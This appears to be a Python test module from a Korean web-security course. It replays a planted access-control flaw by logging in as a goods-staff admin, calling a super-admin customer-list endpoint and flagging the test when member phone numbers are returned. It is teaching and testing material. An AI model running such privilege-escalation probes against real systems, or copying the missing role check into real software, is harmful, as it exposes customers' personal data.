"""T02 · 관리자 기능이 역할 확인 없이 열림(A01). 수업 2-3.

상품 담당 직원(staff_goods, 상품 관리자 역할)으로 로그인해 슈퍼 관리자용 고객 목록(/daon/customer/list)을 부른다.
회원 목록(전화번호 포함)이 돌아오면 레드.
"""
from __future__ import annotations

from replay import NotReady, Result
from replay._http import ADMINS, admin_get

T = "T02"
TITLE = "관리자 기능이 역할 확인 없이 열림"
LESSON = "2-3"
SOURCE = "[교육용 추가] 새 관리자 기능 + 권한표에 없는 주소를 통과시키는 검사"
STACKS = ("spring",)

ATTACKER = "staff_goods"
PATH = "/daon/customer/list"


def call(user: str, path: str = PATH) -> tuple[int, dict]:
    r = admin_get(user, path)
    try:
        return r.status_code, r.json()
    except ValueError:
        return r.status_code, {}


def run(stack: str = "spring") -> Result:
    if stack not in STACKS:
        raise NotReady(f"{T} {stack} 재연은 아직 없습니다(Express는 diffs/s2-03/express.diff로 확인).")
    status, body = call(ATTACKER)
    rows = body.get("data") if body.get("code") == 200 else None
    ev = [f"요청: {ATTACKER}({ADMINS[ATTACKER]['role']}) 토큰으로 GET {PATH}  (슈퍼 관리자용 기능)",
          f"응답: HTTP {status} code={body.get('code')} message={body.get('message')!r}"]
    if isinstance(rows, list) and rows:
        ev.append(f"보인 정보: 회원 {len(rows)}명, 예) {rows[0].get('username')} 전화={rows[0].get('phone')}")
        return Result(True, f"{ATTACKER}가 슈퍼 관리자용 고객 목록을 받았다", ev)
    return Result(False, f"{ATTACKER}는 고객 목록을 받을 수 없다", ev)
